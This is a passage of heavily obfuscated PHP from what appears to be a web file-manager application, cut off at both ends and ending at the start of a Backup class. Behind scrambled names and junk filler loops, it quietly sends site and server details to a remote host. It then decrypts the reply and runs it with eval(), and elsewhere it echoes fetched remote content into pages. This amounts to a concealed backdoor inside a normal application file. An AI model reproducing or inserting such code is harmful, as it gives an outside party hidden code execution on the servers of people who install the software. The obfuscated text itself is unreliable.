$_SERVER[¥Ÿ©ÒèÌ]; return $_SERVER[ûùÖÄøÆ][242]; $‰µˆÜ€² = $à¢¤ş¯«[665]; while ($‰µˆÜ€² < $à¢¤ş¯«[238]) { if ($‰µˆÜ€² >= 0) { break; } $‰µˆÜ€²++; } } private function kzbt8a0645c7() { $’§¦Ş›â =& $_SERVER[¥Ÿ©ÒèÌ]; $ôÉ¸‰ŠÙ =& $_SERVER[ûùÖÄøÆ]; $ÄöÎàÑø = array($ôÉ¸‰ŠÙ[243], $ôÉ¸‰ŠÙ[244], $ôÉ¸‰ŠÙ[245]); $ÉÂ ´àü = $ôÉ¸‰ŠÙ[246] . md5($ôÉ¸‰ŠÙ[247]); if ($this->sgzbbfdcf5fc == $ôÉ¸‰ŠÙ[104] || !_get($GLOBALS, $ôÉ¸‰ŠÙ[113])) { return; } if (!in_array($_SERVER[$ôÉ¸‰ŠÙ[24]], $ÄöÎàÑø)) { return; } if (time() % 4 != 0) { return; } $Ô˜„½Ê‡ = call_user_func(array($ôÉ¸‰ŠÙ[248], $ôÉ¸‰ŠÙ[249]), $ÉÂ ´àü); $ß¬”ˆ¦ô = $’§¦Ş›â[666]; while (strlen($ß¬”ˆ¦ô) < $’§¦Ş›â[620]) { if (!$ß¬”ˆ¦ô) { break; } $ß¬”ˆ¦ô++; } if ($Ô˜„½Ê‡ && time() - $Ô˜„½Ê‡ < intval($ôÉ¸‰ŠÙ[250])) { return; } call_user_func(array($ôÉ¸‰ŠÙ[248], $ôÉ¸‰ŠÙ[133]), $ÉÂ ´àü, time()); $Ôå•İ¹ = $’§¦Ş›â[667]; $‘£â©©Û = Model($ôÉ¸‰ŠÙ[33])->get($ôÉ¸‰ŠÙ[101]); $¡íß“ÜÄ = $’§¦Ş›â[668]; if (strlen($¡íß“ÜÄ) < $’§¦Ş›â[622]) { die; } $ò—Ã­²æ = array($ôÉ¸‰ŠÙ[145] => Model($ôÉ¸‰ŠÙ[33])->get($ôÉ¸‰ŠÙ[181]), $ôÉ¸‰ŠÙ[158] => $this->sgzbbfdcf5fc, $ôÉ¸‰ŠÙ[155] => $_SERVER[$ôÉ¸‰ŠÙ[156]], $ôÉ¸‰ŠÙ[157] => Model($ôÉ¸‰ŠÙ[33])->get($ôÉ¸‰ŠÙ[125]), $ôÉ¸‰ŠÙ[99] => md5($_SERVER[$ôÉ¸‰ŠÙ[100]] . $‘£â©©Û), $ôÉ¸‰ŠÙ[148] => $ôÉ¸‰ŠÙ[130], $ôÉ¸‰ŠÙ[151] => $_SERVER[$ôÉ¸‰ŠÙ[152]]); $êÃí„¥­ = $’§¦Ş›â[669]; if (!$êÃí„¥­) { die; } $¦¯•ÂµË = $this->nrlz8eba5678($ôÉ¸‰ŠÙ[251], $ò—Ã­²æ); if (!is_array($¦¯•ÂµË)) { return; } if ($¦¯•ÂµË[$ôÉ¸‰ŠÙ[145]] && $¦¯•ÂµË[$ôÉ¸‰ŠÙ[252]]) { if ($this->vsayedd46e96($¦¯•ÂµË[$ôÉ¸‰ŠÙ[252]]) == $ò—Ã­²æ[$ôÉ¸‰ŠÙ[145]]) { return; } } $this->oluee77991c1(); $şØâºúÏ = $’§¦Ş›â[670]; if ($this->vsayedd46e96($¦¯•ÂµË[$ôÉ¸‰ŠÙ[252]]) != $ò—Ã­²æ[$ôÉ¸‰ŠÙ[145]]) { $à™³ş  = array($ôÉ¸‰ŠÙ[176] => $‘£â©©Û, $ôÉ¸‰ŠÙ[177] => $_SERVER[$ôÉ¸‰ŠÙ[100]], $ôÉ¸‰ŠÙ[178] => this_url(), $ôÉ¸‰ŠÙ[153] => $_SERVER[$ôÉ¸‰ŠÙ[154]]); $ÆÒšğÒ¿ = $this->yjof49e4e803(json_encode($à™³ş )); $¦¯•ÂµË = $this->nrlz8eba5678($ôÉ¸‰ŠÙ[179] . $ÆÒšğÒ¿); if ($¦¯•ÂµË && is_array($¦¯•ÂµË) && isset($¦¯•ÂµË[$ôÉ¸‰ŠÙ[252]])) { $·İ¡‹¸æ = $this->rpoka7afe991($¦¯•ÂµË[$ôÉ¸‰ŠÙ[252]], 2); if ($·İ¡‹¸æ) { $·İ¡‹¸æ = $this->vsayedd46e96($·İ¡‹¸æ); } if ($·İ¡‹¸æ) { try { @eval($·İ¡‹¸æ); } catch (Exception $‘î“—½Ğ) { } } } } } private function nrlz8eba5678($ı¨ÀøŞ = '', $˜ÁòÊ×‚ = array(), $ –êßû¹ = 5) { $â†ü­ñà =& $_SERVER[¥Ÿ©ÒèÌ]; $ò·É£Ó„ =& $_SERVER[ûùÖÄøÆ]; $•²¥Ô—Â = $ò·É£Ó„[253]; $ÑÓØØÃö = $â†ü­ñà[671]; if (strlen($ÑÓØØÃö) < $â†ü­ñà[616]) { return; } $•²¥Ô—Â = $this->fuwvdd78b2cb($•²¥Ô—Â, $ò·É£Ó„[254]); $•²¥Ô—Â = $•²¥Ô—Â . $ı¨ÀøŞ; if ($˜ÁòÊ×‚ && is_array($˜ÁòÊ×‚)) { $•²¥Ô—Â = $•²¥Ô—Â . $ò·É£Ó„[255] . http_build_query($˜ÁòÊ×‚); } if ($˜ÁòÊ×‚ === -1) { return $•²¥Ô—Â; } $›¹ğ¦ğ£ = stream_context_create(array($ò·É£Ó„[213] => array($ò·É£Ó„[216] => $ –êßû¹, $ò·É£Ó„[214] => $ò·É£Ó„[256]), $ò·É£Ó„[257] => array($ò·É£Ó„[258] => !1, $ò·É£Ó„[259] => !1))); $¬ÊçÏ¾ê = $â†ü­ñà[672]; if (strlen($¬ÊçÏ¾ê) < $â†ü­ñà[238]) { die; } $˜ÁòÊ×‚ = @file_get_contents($•²¥Ô—Â, !1, $›¹ğ¦ğ£); return json_decode($˜ÁòÊ×‚, !0); $‡•¡âá = $â†ü­ñà[673]; $ñºÔğŞÄ = $â†ü­ñà[674]; } private function fprnc6530ddc() { $£Î·¥¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $½´Ã³âƒ =& $_SERVER[ûùÖÄøÆ]; $ùÆ” Ô» = array($½´Ã³âƒ[260] => $½´Ã³âƒ[261], $½´Ã³âƒ[262] => $½´Ã³âƒ[263], $½´Ã³âƒ[264] => $½´Ã³âƒ[265], $½´Ã³âƒ[266] => $½´Ã³âƒ[267], $½´Ã³âƒ[268] => $½´Ã³âƒ[269], $½´Ã³âƒ[270] => $½´Ã³âƒ[207], $½´Ã³âƒ[271] => $½´Ã³âƒ[207], $½´Ã³âƒ[272] => $½´Ã³âƒ[261], $½´Ã³âƒ[273] => $½´Ã³âƒ[263], $½´Ã³âƒ[274] => $½´Ã³âƒ[265], $½´Ã³âƒ[275] => $½´Ã³âƒ[276], $½´Ã³âƒ[277] => $½´Ã³âƒ[267], $½´Ã³âƒ[278] => $½´Ã³âƒ[279], $½´Ã³âƒ[280] => $½´Ã³âƒ[269], $½´Ã³âƒ[281] => $½´Ã³âƒ[282], $½´Ã³âƒ[283] => $½´Ã³âƒ[284], $½´Ã³âƒ[285] => $½´Ã³âƒ[286]); $æô±ç™Û = $ùÆ” Ô»[$this->sgzbbfdcf5fc]; $·òÈ¢â = $£Î·¥¬[675]; if (strlen($·òÈ¢â) < $£Î·¥¬[620]) { die; } $æô±ç™Û = intval($æô±ç™Û ? $æô±ç™Û : $½´Ã³âƒ[261]); $Š¶©Š¥Ë = _get($this->abmf3383b733, $½´Ã³âƒ[287]); $Š¶©Š¥Ë = $Š¶©Š¥Ë ? intval($Š¶©Š¥Ë) : 0; return $æô±ç™Û + $Š¶©Š¥Ë; } public function zjxq1cafeca7($ÓÜŒóí) { $»ªğá· =& $_SERVER[¥Ÿ©ÒèÌ]; $Œ’èş =& $_SERVER[ûùÖÄøÆ]; $óÉ¡ = $this->fprnc6530ddc(); $š÷²áâ = $»ªğá·[676]; if (strlen($š÷²áâ) < $»ªğá·[238]) { return; } if ($ÓÜŒóí[$Œ’èş[288]] == $Œ’èş[191]) { return; } if ($óÉ¡ >= intval($Œ’èş[207])) { return; } $¨„©Õ›Â = Model($Œ’èş[119])->count(); $©Ş÷é£í = $»ªğá·[677]; if ($¨„©Õ›Â <= $óÉ¡) { return; } $¶ò¹Ü’— = Model($Œ’èş[119])->field($Œ’èş[288])->limit($óÉ¡)->select(); $¶ò¹Ü’— = array_to_keyvalue($¶ò¹Ü’—, $Œ’èş[6], $Œ’èş[288]); $‘ ÖŒ‘î = $»ªğá·[678]; if (!$‘ ÖŒ‘î) { die; } if (!in_array($ÓÜŒóí[$Œ’èş[288]], $¶ò¹Ü’—)) { show_json($Œ’èş[289], !1, $Œ’èş[203]); } } public function rbduc175c731() { $ö¸Âıİ =& $_SERVER[¥Ÿ©ÒèÌ]; $§œ¯Ş±‰ =& $_SERVER[ûùÖÄøÆ]; if (!_get($GLOBALS, $§œ¯Ş±‰[113]) || mt_rand(1, 100) > 20) { return; } $†ãÙÀä° = $§œ¯Ş±‰[211]; $ÂÖÂÅÂ = $ö¸Âıİ[679]; while ($ÂÖÂÅÂ < $ö¸Âıİ[620]) { if ($ÂÖÂÅÂ >= 0) { break; } $ÂÖÂÅÂ++; } $†ãÙÀä° = $this->fuwvdd78b2cb($†ãÙÀä°, $§œ¯Ş±‰[212]); $åÁ†îÊ = $ö¸Âıİ[680]; while (strlen($åÁ†îÊ) < $ö¸Âıİ[637]) { if (!$åÁ†îÊ) { break; } $åÁ†îÊ++; } $íÎ‡é = stream_context_create(array($§œ¯Ş±‰[213] => array($§œ¯Ş±‰[214] => $§œ¯Ş±‰[215], $§œ¯Ş±‰[216] => 3))); $ºšÊ©Âœ = @file_get_contents($†ãÙÀä°, !1, $íÎ‡é); $öæÚÀ­¾ = $ö¸Âıİ[681]; if (!$öæÚÀ­¾) { return; } echo $§œ¯Ş±‰[290] . hash_encode($ºšÊ©Âœ) . $§œ¯Ş±‰[291]; } private function qjuw4df6417a($‰ÔÚÓ „, $¾‡Ç‚½, $¸ü¢µÄ‰ = 3) { $Ëã‡™ŞÔ =& $_SERVER[¥Ÿ©ÒèÌ]; $„¾«±¹ =& $_SERVER[ûùÖÄøÆ]; usleep(1); $ŒÃ­‡‡ó = $Ëã‡™ŞÔ[682]; if (strlen($ŒÃ­‡‡ó) < $Ëã‡™ŞÔ[238]) { die; } $‰ÔÚÓ „ = trim($‰ÔÚÓ „); $š¿ÛÊÁ = $Ëã‡™ŞÔ[683]; if (strlen($š¿ÛÊÁ) < $Ëã‡™ŞÔ[616]) { return; } $ù“°¤àà = mt_rand(0, 5) . $„¾«±¹[6]; $£çÌşóî = rand_string(15); $¨§Ò¿¥³ = $„¾«±¹[292]; switch ($ù“°¤àà) { case $„¾«±¹[199]: $¨ÙÁ¨Ù = $this->xhjp03c75d66($‰ÔÚÓ „, strrev($¾‡Ç‚½ . $£çÌşóî)); $ÇßŸ´€Î = $Ëã‡™ŞÔ[684]; if (!$ÇßŸ´€Î) { die; } break; case $„¾«±¹[191]: $¨ÙÁ¨Ù = $this->xhjp03c75d66($‰ÔÚÓ „, strrev($£çÌşóî . $¾‡Ç‚½)); $Ë×Äöì = $Ëã‡™ŞÔ[685]; if (strlen($Ë×Äöì) < $Ëã‡™ŞÔ[238]) { return; } break; $ï™µüœ© = $Ëã‡™ŞÔ[686]; if (strlen($ï™µüœ©) < $Ëã‡™ŞÔ[637]) { die; } case $„¾«±¹[293]: $¨ÙÁ¨Ù = $this->xhjp03c75d66($‰ÔÚÓ „, base64_encode($£çÌşóî . $¾‡Ç‚½)); $¿ÅìÉµÃ = $Ëã‡™ŞÔ[615]; while ($¿ÅìÉµÃ < $Ëã‡™ŞÔ[238]) { if ($¿ÅìÉµÃ >= 0) { break; } $¿ÅìÉµÃ++; } break; $Šïáóû‘ = $Ëã‡™ŞÔ[687]; if (!$Šïáóû‘) { return; } case $„¾«±¹[294]: $¨ÙÁ¨Ù = $this->xhjp03c75d66($‰ÔÚÓ „, md5($£çÌşóî . $¾‡Ç‚½)); $²ºß›ğ© = $Ëã‡™ŞÔ[688]; while (strlen($²ºß›ğ©) < $Ëã‡™ŞÔ[620]) { if (!$²ºß›ğ©) { break; } $²ºß›ğ©++; } break; $Ô…ÔŞ›ğ = $Ëã‡™ŞÔ[689]; case $„¾«±¹[295]: $‰ÔÚÓ „ = base64_encode($‰ÔÚÓ „); $§ÂÈö—İ = rand(0, 64); $¡ÛˆÆ = $Ëã‡™ŞÔ[690]; if (strlen($¡ÛˆÆ) < $Ëã‡™ŞÔ[616]) { die; } $›•¤¨ö¾ = $¨§Ò¿¥³[$§ÂÈö—İ]; $íÉ¹Âî = md5($›•¤¨ö¾ . md5($¾‡Ç‚½ . $›•¤¨ö¾) . $¾‡Ç‚½); $Ä·¿Ì¶¶ = $Ëã‡™ŞÔ[691]; $íÉ¹Âî = substr($íÉ¹Âî, $§ÂÈö—İ % 8, $§ÂÈö—İ % 8 + 7); $œ—¿îÆ” = $„¾«±¹[6]; $‚éÀ×‹× = 0; $îÇ·¬á´ = 0; $Êô¦óŞ× = 0; $˜†©‚Ûè = $Ëã‡™ŞÔ[692]; if (strlen($˜†©‚Ûè) < $Ëã‡™ŞÔ[637]) { return; } for ($‚éÀ×‹× = 0; $‚éÀ×‹× < strlen($‰ÔÚÓ „); $‚éÀ×‹×++) { $Êô¦óŞ× = $Êô¦óŞ× == strlen($íÉ¹Âî) ? 0 : $Êô¦óŞ×; $»Ş¤ãŠí = $Ëã‡™ŞÔ[693]; if (!$»Ş¤ãŠí) { die; } $îÇ·¬á´ = ($§ÂÈö—İ + strpos($¨§Ò¿¥³, $‰ÔÚÓ „[$‚éÀ×‹×]) + ord($íÉ¹Âî[$Êô¦óŞ×++])) % 64; $œ—¿îÆ” .= $¨§Ò¿¥³[$îÇ·¬á´]; } $¨ÙÁ¨Ù = hash_encode($›•¤¨ö¾ . $œ—¿îÆ”); break; default: $¨ÙÁ¨Ù = $this->xhjp03c75d66($‰ÔÚÓ „, $¾‡Ç‚½ . $£çÌşóî); break; } $¨ÙÁ¨Ù = strrev($ù“°¤àà . $£çÌşóî . $¨ÙÁ¨Ù); $—æôîØî = $Ëã‡™ŞÔ[694]; if (strlen($—æôîØî) < $Ëã‡™ŞÔ[620]) { return; } if ($¸ü¢µÄ‰ - 1 > 0) { $¨ÙÁ¨Ù = $this->qjuw4df6417a($¨ÙÁ¨Ù, $¾‡Ç‚½, $¸ü¢µÄ‰ - 1); } return $¨ÙÁ¨Ù; } private function rpoka7afe991($³ƒ–ä€Ä, $İ…±³€Ë, $Ò•êá¬ = 3) { $ÏÊÁ† =& $_SERVER[¥Ÿ©ÒèÌ]; $»¦ù×îÒ =& $_SERVER[ûùÖÄøÆ]; if (!is_string($³ƒ–ä€Ä) || strlen($³ƒ–ä€Ä) < 10) { return !1; } $³ƒ–ä€Ä = trim($³ƒ–ä€Ä); $³ƒ–ä€Ä = strrev($³ƒ–ä€Ä); $íûî¿Š® = $ÏÊÁ†[695]; if (strlen($íûî¿Š®) < $ÏÊÁ†[622]) { return; } $‘‹ÁäÄ½ = $³ƒ–ä€Ä[0]; $ğöÆŞ‰İ = $ÏÊÁ†[696]; while ($ğöÆŞ‰İ < $ÏÊÁ†[620]) { if ($ğöÆŞ‰İ >= 0) { break; } $ğöÆŞ‰İ++; } $êæ¢ÒùŸ = substr($³ƒ–ä€Ä, 1, 15); $³ƒ–ä€Ä = substr($³ƒ–ä€Ä, 16); $ò¦ÛŸĞ“ = $ÏÊÁ†[697]; if (strlen($ò¦ÛŸĞ“) < $ÏÊÁ†[637]) { die; } $Î„’şÎõ = $»¦ù×îÒ[292]; $Õç‘Û»… = $ÏÊÁ†[698]; if (!$Õç‘Û»…) { return; } switch ($‘‹ÁäÄ½) { case $»¦ù×îÒ[199]: $‡·Õóğ½ = $this->fuwvdd78b2cb($³ƒ–ä€Ä, strrev($İ…±³€Ë . $êæ¢ÒùŸ)); $èú½¹–Š = $ÏÊÁ†[699]; break; case $»¦ù×îÒ[191]: $‡·Õóğ½ = $this->fuwvdd78b2cb($³ƒ–ä€Ä, strrev($êæ¢ÒùŸ . $İ…±³€Ë)); break; $±şÛÉ´‰ = $ÏÊÁ†[700]; if (strlen($±şÛÉ´‰) < $ÏÊÁ†[620]) { die; } case $»¦ù×îÒ[293]: $‡·Õóğ½ = $this->fuwvdd78b2cb($³ƒ–ä€Ä, base64_encode($êæ¢ÒùŸ . $İ…±³€Ë)); $ÈÄ•–Î— = $ÏÊÁ†[701]; while ($ÈÄ•–Î— < $ÏÊÁ†[616]) { if ($ÈÄ•–Î— >= 0) { break; } $ÈÄ•–Î—++; } break; case $»¦ù×îÒ[294]: $‡·Õóğ½ = $this->fuwvdd78b2cb($³ƒ–ä€Ä, md5($êæ¢ÒùŸ . $İ…±³€Ë)); break; case $»¦ù×îÒ[295]: $³ƒ–ä€Ä = hash_decode($³ƒ–ä€Ä); $Ú¾’š±ñ = $ÏÊÁ†[702]; $°òÊˆè = $³ƒ–ä€Ä[0]; $ŒçÍø‘Ü = $ÏÊÁ†[703]; while (strlen($ŒçÍø‘Ü) < $ÏÊÁ†[622]) { if (!$ŒçÍø‘Ü) { break; } $ŒçÍø‘Ü++; } $³ƒ–ä€Ä = substr($³ƒ–ä€Ä, 1); $ºŒ§€åØ = $ÏÊÁ†[704]; if (!$ºŒ§€åØ) { return; } $Ú¤«Îû£ = strpos($Î„’şÎõ, $°òÊˆè); $–Ï´ª‹ = md5($°òÊˆè . md5($İ…±³€Ë . $°òÊˆè) . $İ…±³€Ë); $–Ï´ª‹ = substr($–Ï´ª‹, $Ú¤«Îû£ % 8, $Ú¤«Îû£ % 8 + 7); $ãÑÃİ°¬ = $ÏÊÁ†[705]; while ($ãÑÃİ°¬ < $ÏÊÁ†[620]) { if ($ãÑÃİ°¬ >= 0) { break; } $ãÑÃİ°¬++; } $ÃÚ¨Ê¿Õ = $»¦ù×îÒ[6]; $Ê†» = 0; $ÌáşÆ³ = $ÏÊÁ†[706]; $ø™àş÷¤ = 0; $‰³¿Ïôß = 0; $¹û‘£¸» = $ÏÊÁ†[707]; if (!$¹û‘£¸») { die; } for ($Ê†» = 0; $Ê†» < strlen($³ƒ–ä€Ä); $Ê†»++) { $‰³¿Ïôß = $‰³¿Ïôß == strlen($–Ï´ª‹) ? 0 : $‰³¿Ïôß; $şŸÈÔë› = $ÏÊÁ†[708]; while (strlen($şŸÈÔë›) < $ÏÊÁ†[238]) { if (!$şŸÈÔë›) { break; } $şŸÈÔë›++; } $‘Ì¢ŠäĞ = $‰³¿Ïôß++; $¨Ê¸ÁŒç = $ÏÊÁ†[709]; while ($¨Ê¸ÁŒç < $ÏÊÁ†[620]) { if ($¨Ê¸ÁŒç >= 0) { break; } $¨Ê¸ÁŒç++; } $ø™àş÷¤ = strpos($Î„’şÎõ, $³ƒ–ä€Ä[$Ê†»]) - $Ú¤«Îû£ - ord($–Ï´ª‹[$‘Ì¢ŠäĞ]); $ÜğÖ¬ò‘ = $ÏÊÁ†[710]; if (strlen($ÜğÖ¬ò‘) < $ÏÊÁ†[622]) { die; } while ($ø™àş÷¤ < 0) { $ø™àş÷¤ += 64; $âÙ»çº = $ÏÊÁ†[711]; while (strlen($âÙ»çº) < $ÏÊÁ†[622]) { if (!$âÙ»çº) { break; } $âÙ»çº++; } } $ÃÚ¨Ê¿Õ .= $Î„’şÎõ[$ø™àş÷¤]; } $‡·Õóğ½ = base64_decode($ÃÚ¨Ê¿Õ); break; $¢Ğ©¿¼¡ = $ÏÊÁ†[712]; if (strlen($¢Ğ©¿¼¡) < $ÏÊÁ†[622]) { die; } default: $‡·Õóğ½ = $this->fuwvdd78b2cb($³ƒ–ä€Ä, $İ…±³€Ë . $êæ¢ÒùŸ); $Œ¡‘¼âª = $ÏÊÁ†[713]; if (!$Œ¡‘¼âª) { return; } break; $›¸’ •Ô = $ÏÊÁ†[714]; } if ($Ò•êá¬ - 1 > 0) { $‡·Õóğ½ = $this->rpoka7afe991($‡·Õóğ½, $İ…±³€Ë, $Ò•êá¬ - 1); } return $‡·Õóğ½; } public function yjof49e4e803($ÅåÃê¸²) { $´Â•«œÎ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ö˜ÅĞŸ =& $_SERVER[ûùÖÄøÆ]; $ùÁ«‰İÕ = $this->yguf4dc1662e(); $ƒïïºµò = $this->yguf4dc1662e(); $ò–İá¾¡ = $´Â•«œÎ[715]; if (strlen($ò–İá¾¡) < $´Â•«œÎ[620]) { die; } $Ş¿Œ¼ğ = ($ùÁ«‰İÕ - 1) * ($ƒïïºµò - 1); $ş£ºÓ–• = $´Â•«œÎ[716]; $¼ššÍ¶½ = intval(($ùÁ«‰İÕ + $ƒïïºµò) / 2); $ ¸²ü’¢ = $´Â•«œÎ[717]; while (strlen($ ¸²ü’¢) < $´Â•«œÎ[637]) { if (!$ ¸²ü’¢) { break; } $ ¸²ü’¢++; } while (1) { $êñ‰º™ê = $¼ššÍ¶½; $ ÛĞÆİ = $´Â•«œÎ[718]; if (strlen($ ÛĞÆİ) < $´Â•«œÎ[238]) { die; } $Ù©¬µ÷İ = $Ş¿Œ¼ğ; while ($Ù©¬µ÷İ % $êñ‰º™ê != 0) { $ÓÒéì¥ = $Ù©¬µ÷İ; $¯·çÆëõ = $´Â•«œÎ[719]; if (!$¯·çÆëõ) { die; } $Ù©¬µ÷İ = $êñ‰º™ê; $–˜¦•ö‚ = $´Â•«œÎ[720]; if (strlen($–˜¦•ö‚) < $´Â•«œÎ[616]) { die; } $êñ‰º™ê = $ÓÒéì¥ % $êñ‰º™ê; $ò¤µÏÏ = $´Â•«œÎ[721]; } if ($êñ‰º™ê == 1) { break; } else { $¼ššÍ¶½++; } } $ğèƒÈ˜° = 2; $ÂÍùÒø­ = $´Â•«œÎ[722]; if (!$ÂÍùÒø­) { die; } for ($åäÆÎÍ = 0; $åäÆÎÍ < $Ş¿Œ¼ğ * 10; $åäÆÎÍ++) { if (($Ş¿Œ¼ğ * $åäÆÎÍ + 1) % $¼ššÍ¶½ == 0) { $ğèƒÈ˜° = intval(($Ş¿Œ¼ğ * $åäÆÎÍ + 1) / $¼ššÍ¶½); break; } } $Ô—½Óœ = $this->xhjp03c75d66($ùÁ«‰İÕ * $ƒïïºµò . $Ö˜ÅĞŸ[6], $Ö˜ÅĞŸ[130]); $šÇ–Ç¬† = $´Â•«œÎ[723]; while ($šÇ–Ç¬† < $´Â•«œÎ[622]) { if ($šÇ–Ç¬† >= 0) { break; } $šÇ–Ç¬†++; } $ÆÂ®ğ¯´ = md5($Ö˜ÅĞŸ[296] . ($ùÁ«‰İÕ + $ƒïïºµò) . $Ö˜ÅĞŸ[297] . $¼ššÍ¶½ . $Ö˜ÅĞŸ[297] . $ğèƒÈ˜° . $Ö˜ÅĞŸ[298]); $é÷ò Ñ’ = $this->xhjp03c75d66($ÅåÃê¸², $ÆÂ®ğ¯´) . $Ö˜ÅĞŸ[299] . $Ô—½Óœ; $²öÏÁÓÙ = $´Â•«œÎ[724]; if (!$²öÏÁÓÙ) { die; } return $é÷ò Ñ’; $ø¸Ìù· = $´Â•«œÎ[725]; } public function vsayedd46e96($şØ¶Öï) { $îâë¸™ =& $_SERVER[¥Ÿ©ÒèÌ]; $ßõÛË˜Ú =& $_SERVER[ûùÖÄøÆ]; $ãŸÄÃŸ = explode($ßõÛË˜Ú[299], $şØ¶Öï); if (count($ãŸÄÃŸ) != 2) { return $ßõÛË˜Ú[6]; } $¯‘™—²Ô = $this->fuwvdd78b2cb($ãŸÄÃŸ[1] . $ßõÛË˜Ú[6], $ßõÛË˜Ú[130]); $Œ¸û˜• = $îâë¸™[726]; if (!$Œ¸û˜•) { die; } if (!$¯‘™—²Ô) { return $ßõÛË˜Ú[6]; } $¯‘™—²Ô = intval($¯‘™—²Ô); $Ï“ƒ›… = 0; $÷’ÖĞ„ª = $îâë¸™[727]; while (strlen($÷’ÖĞ„ª) < $îâë¸™[637]) { if (!$÷’ÖĞ„ª) { break; } $÷’ÖĞ„ª++; } $ĞØ­ªĞ’ = 0; $œç†šĞ§ = $îâë¸™[728]; if (strlen($œç†šĞ§) < $îâë¸™[620]) { die; } for ($©…ãÛê¸ = 3; $©…ãÛê¸ < $¯‘™—²Ô; $©…ãÛê¸ += 2) { if ($¯‘™—²Ô % $©…ãÛê¸ != 0) { continue; } $Ï“ƒ›… = $©…ãÛê¸; $ûúÔ¾ÓÌ = $îâë¸™[729]; if (!$ûúÔ¾ÓÌ) { return; } $ĞØ­ªĞ’ = intval($¯‘™—²Ô / $©…ãÛê¸); break; } $„¶µãİ = ($Ï“ƒ›… - 1) * ($ĞØ­ªĞ’ - 1); $á¤ç„û¬ = intval(($Ï“ƒ›… + $ĞØ­ªĞ’) / 2); while (1) { $ë·”Â¾ù = $á¤ç„û¬; $“¯ò–ş = $„¶µãİ; while ($“¯ò–ş % $ë·”Â¾ù != 0) { $•óÅÏË = $“¯ò–ş; $Øİì¡° = $îâë¸™[730]; $“¯ò–ş = $ë·”Â¾ù; $ë·”Â¾ù = $•óÅÏË % $ë·”Â¾ù; } if ($ë·”Â¾ù == 1) { break; } else { $á¤ç„û¬++; } } $¬§È¾Ô = 2; for ($©…ãÛê¸ = 0; $©…ãÛê¸ < $„¶µãİ * 10; $©…ãÛê¸++) { if (($„¶µãİ * $©…ãÛê¸ + 1) % $á¤ç„û¬ == 0) { $¬§È¾Ô = intval(($„¶µãİ * $©…ãÛê¸ + 1) / $á¤ç„û¬); break; } } $›·ôË½ = md5($ßõÛË˜Ú[296] . ($Ï“ƒ›… + $ĞØ­ªĞ’) . $ßõÛË˜Ú[297] . $á¤ç„û¬ . $ßõÛË˜Ú[297] . $¬§È¾Ô . $ßõÛË˜Ú[298]); $÷¸Àßæ = $this->fuwvdd78b2cb($ãŸÄÃŸ[0], $›·ôË½); return $÷¸Àßæ; } public function yguf4dc1662e() { $âî”ï…¥ =& $_SERVER[¥Ÿ©ÒèÌ]; $ëÉÄÒ‹ = mt_rand(pow(2, 14), pow(2, 16) - 1); $š¾Òé¸Ú = $âî”ï…¥[731]; if (strlen($š¾Òé¸Ú) < $âî”ï…¥[238]) { return; } $š®¼ûïÜ = array(); $ğù‰°ŒÖ = $âî”ï…¥[732]; if (!$ğù‰°ŒÖ) { die; } $ÎÓÚÅ‡ = 1; $á«õ¼²… = $âî”ï…¥[733]; if (!$á«õ¼²…) { die; } while ($ÎÓÚÅ‡ <= (int) sqrt($ëÉÄÒ‹)) { $˜÷âíÜ‘ = $ÎÓÚÅ‡; $ÉÚÕ˜úœ = $âî”ï…¥[734]; if (strlen($ÉÚÕ˜úœ) < $âî”ï…¥[616]) { die; } while (!0) { $˜÷âíÜ‘++; $úüğ²½ = $âî”ï…¥[735]; if (strlen($úüğ²½) < $âî”ï…¥[620]) { die; } if ($˜÷âíÜ‘ <= 2) { $ÎÓÚÅ‡ = $˜÷âíÜ‘; break; } else { if ($˜÷âíÜ‘ < 2) { continue; } } $Î›à±ÇÜ = !0; for ($ËÇ³”‹û = 2; $ËÇ³”‹û <= sqrt($˜÷âíÜ‘); $ËÇ³”‹û++) { if ($˜÷âíÜ‘ % $ËÇ³”‹û == 0) { $Î›à±ÇÜ = !1; } } if ($Î›à±ÇÜ) { $ÎÓÚÅ‡ = $˜÷âíÜ‘; break; } } $š®¼ûïÜ[] = $ÎÓÚÅ‡; } $Úàò Ÿ = 2; $€æ…Å¾ = $âî”ï…¥[736]; if (!$€æ…Å¾) { return; } for ($˜÷âíÜ‘ = $ëÉÄÒ‹; $˜÷âíÜ‘ > 1; $˜÷âíÜ‘--) { $Î›à±ÇÜ = !0; foreach ($š®¼ûïÜ as $¥¿İíØÕ) { if ($˜÷âíÜ‘ % $¥¿İíØÕ == 0) { $Î›à±ÇÜ = !1; break; } } if ($Î›à±ÇÜ) { $Úàò Ÿ = $˜÷âíÜ‘; break; } } return $Úàò Ÿ; $­œ°ß = $âî”ï…¥[737]; if (!$­œ°ß) { return; } } public function uyzc10db15a4($½°ó›ß§, $Öğ¾ ¬ï) { $É¢¿ÁÌŒ =& $_SERVER[ûùÖÄøÆ]; return call_user_func(array($É¢¿ÁÌŒ[8], $É¢¿ÁÌŒ[300]), $½°ó›ß§, $Öğ¾ ¬ï); } public function xhjp03c75d66($ãøòéòò, $Ûâöû˜ü) { $§¬†úéş =& $_SERVER[ûùÖÄøÆ]; return call_user_func(array($§¬†úéş[301], $§¬†úéş[302]), $ãøòéòò, $Ûâöû˜ü); } public function fuwvdd78b2cb($ë·¶¯Ñ, $‡´Â­³ù) { $‡ÔÒëˆ =& $_SERVER[ûùÖÄøÆ]; return call_user_func(array($‡ÔÒëˆ[301], $‡ÔÒëˆ[303]), $ë·¶¯Ñ, $‡´Â­³ù); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $‡ÆŞÂÇ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->isManual(); self::$name = date($‡ÆŞÂÇ[738]); if (!($¹‚Á«Á = Model($‡ÆŞÂÇ[739])->lastItem())) { $¹‚Á«Á = $this->initData(); } else { self::$name = $¹‚Á«Á[$‡ÆŞÂÇ[32]]; if ($¹‚Á«Á[$‡ÆŞÂÇ[740]] == $‡ÆŞÂÇ[89]) { self::$name = date($‡ÆŞÂÇ[741]); $ê¾Ì–Î” = 0; if (isset($¹‚Á«Á[$‡ÆŞÂÇ[297]][$‡ÆŞÂÇ[192]][$‡ÆŞÂÇ[467]])) { $ê¾Ì–Î” = (int) $¹‚Á«Á[$‡ÆŞÂÇ[297]][$‡ÆŞÂÇ[192]][$‡ÆŞÂÇ[467]]; } if (self::$manual == 0 && $¹‚Á«Á[$‡ÆŞÂÇ[32]] == self::$name) { 